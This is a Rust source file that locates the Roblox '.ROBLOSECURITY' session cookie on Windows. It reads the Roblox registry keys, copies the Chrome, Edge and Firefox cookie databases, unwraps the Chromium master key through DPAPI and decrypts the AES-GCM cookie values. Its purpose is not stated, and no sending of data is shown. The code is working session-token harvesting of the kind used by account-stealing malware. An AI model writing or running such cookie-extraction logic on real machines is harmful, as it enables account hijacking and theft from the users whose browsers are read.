use std::fs;
use std::path::PathBuf;

#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;

#[derive(Clone)]
pub struct FoundCookie {
    pub cookie: String,
    pub source: String,
}

pub struct CookieFinder;

impl CookieFinder {
    pub fn find_all_cookies() -> Vec<FoundCookie> {
        let mut cookies = Vec::new();
        
        #[cfg(windows)]
        {
            if let Some(cookie) = Self::find_in_registry() {
                cookies.push(FoundCookie {
                    cookie,
                    source: "Windows Registry".to_string(),
                });
            }
            
            if let Some(cookie) = Self::find_in_chrome() {
                cookies.push(FoundCookie {
                    cookie,
                    source: "Google Chrome".to_string(),
                });
            }
            
            if let Some(cookie) = Self::find_in_edge() {
                cookies.push(FoundCookie {
                    cookie,
                    source: "Microsoft Edge".to_string(),
                });
            }
            
            if let Some(cookie) = Self::find_in_firefox() {
                cookies.push(FoundCookie {
                    cookie,
                    source: "Mozilla Firefox".to_string(),
                });
            }
        }
        
        cookies
    }
    
    #[cfg(windows)]
    fn find_in_registry() -> Option<String> {
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        
        if let Ok(key) = hkcu.open_subkey(r"Software\Roblox\RobloxPlayerBrowser\roblox.com") {
            if let Ok(cookie) = key.get_value::<String, _>(".ROBLOSECURITY") {
                if !cookie.is_empty() {
                    return Some(cookie);
                }
            }
        }
        
        if let Ok(key) = hkcu.open_subkey(r"Software\Roblox\RobloxStudioBrowser\roblox.com") {
            if let Ok(cookie) = key.get_value::<String, _>(".ROBLOSECURITY") {
                if !cookie.is_empty() {
                    return Some(cookie);
                }
            }
        }
        
        None
    }
    
    #[cfg(windows)]
    fn find_in_chrome() -> Option<String> {
        let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
        let cookie_path = PathBuf::from(&local_app_data)
            .join("Google/Chrome/User Data/Default/Network/Cookies");
        
        Self::extract_chromium_cookie(&cookie_path, &local_app_data, "Google/Chrome/User Data/Local State")
    }
    
    #[cfg(windows)]
    fn find_in_edge() -> Option<String> {
        let local_app_data = std::env::var("LOCALAPPDATA").ok()?;
        let cookie_path = PathBuf::from(&local_app_data)
            .join("Microsoft/Edge/User Data/Default/Network/Cookies");
        
        Self::extract_chromium_cookie(&cookie_path, &local_app_data, "Microsoft/Edge/User Data/Local State")
    }
    
    #[cfg(windows)]
    fn extract_chromium_cookie(cookie_db_path: &PathBuf, local_app_data: &str, local_state_rel: &str) -> Option<String> {
        use rusqlite::Connection;
        
        if !cookie_db_path.exists() {
            return None;
        }
        
        let temp_path = std::env::temp_dir().join("nexus_cookies_temp.db");
        fs::copy(cookie_db_path, &temp_path).ok()?;
        
        let local_state_path = PathBuf::from(local_app_data).join(local_state_rel);
        let key = Self::get_chromium_key(&local_state_path)?;
        
        let conn = Connection::open(&temp_path).ok()?;
        
        let mut stmt = conn.prepare(
            "SELECT encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com' AND name = '.ROBLOSECURITY' ORDER BY creation_utc DESC LIMIT 1"
        ).ok()?;
        
        let encrypted: Vec<u8> = stmt.query_row([], |row| row.get(0)).ok()?;
        

        fs::remove_file(&temp_path).ok();
        
        Self::decrypt_chromium_cookie(&encrypted, &key)
    }
    
    #[cfg(windows)]
    fn get_chromium_key(local_state_path: &PathBuf) -> Option<Vec<u8>> {
        use base64::Engine;
        use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};
        
        let local_state = fs::read_to_string(local_state_path).ok()?;
        let json: serde_json::Value = serde_json::from_str(&local_state).ok()?;
        
        let encrypted_key_b64 = json
            .get("os_crypt")?
            .get("encrypted_key")?
            .as_str()?;
        
        let encrypted_key = base64::engine::general_purpose::STANDARD
            .decode(encrypted_key_b64).ok()?;
        
        if encrypted_key.len() <= 5 || &encrypted_key[0..5] != b"DPAPI" {
            return None;
        }
        
        let encrypted_key = &encrypted_key[5..];
        
        unsafe {
            let mut input = CRYPT_INTEGER_BLOB {
                cbData: encrypted_key.len() as u32,
                pbData: encrypted_key.as_ptr() as *mut u8,
            };
            let mut output = CRYPT_INTEGER_BLOB {
                cbData: 0,
                pbData: std::ptr::null_mut(),
            };
            
            if CryptUnprotectData(
                &mut input,
                None,
                None,
                None,
                None,
                0,
                &mut output,
            ).is_ok() {
                let decrypted = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
                let _ = windows::Win32::Foundation::LocalFree(windows::Win32::Foundation::HLOCAL(output.pbData as *mut _));
                return Some(decrypted);
            }
        }
        
        None
    }
    
    #[cfg(windows)]
    fn decrypt_chromium_cookie(encrypted: &[u8], key: &[u8]) -> Option<String> {
        use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
        use aes_gcm::aead::generic_array::GenericArray;
        
        // Check for v10/v20 prefix
        if encrypted.len() < 15 {
            return None;
        }
        
        let prefix = &encrypted[0..3];
        if prefix != b"v10" && prefix != b"v20" {
            return None;
        }
        
        let nonce = &encrypted[3..15];
        let ciphertext = &encrypted[15..];
        
        let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
        let nonce = GenericArray::from_slice(nonce);
        
        let decrypted = cipher.decrypt(nonce, ciphertext).ok()?;
        String::from_utf8(decrypted).ok()
    }
    
    #[cfg(windows)]
    fn find_in_firefox() -> Option<String> {
        use rusqlite::Connection;
        
        let app_data = std::env::var("APPDATA").ok()?;
        let profiles_path = PathBuf::from(&app_data).join("Mozilla/Firefox/Profiles");
        
        if !profiles_path.exists() {
            return None;
        }
        
        for entry in fs::read_dir(&profiles_path).ok()? {
            let entry = entry.ok()?;
            let path = entry.path();
            
            if path.is_dir() {
                let cookies_path = path.join("cookies.sqlite");
                if cookies_path.exists() {
                    let temp_path = std::env::temp_dir().join("nexus_ff_cookies_temp.db");
                    if fs::copy(&cookies_path, &temp_path).is_ok() {
                        if let Ok(conn) = Connection::open(&temp_path) {
                            let result: Result<String, _> = conn.query_row(
                                "SELECT value FROM moz_cookies WHERE host LIKE '%roblox.com' AND name = '.ROBLOSECURITY' ORDER BY lastAccessed DESC LIMIT 1",
                                [],
                                |row| row.get(0),
                            );
                            
                            fs::remove_file(&temp_path).ok();
                            
                            if let Ok(cookie) = result {
                                return Some(cookie);
                            }
                        }
                    }
                }
            }
        }
        
        None
    }
}
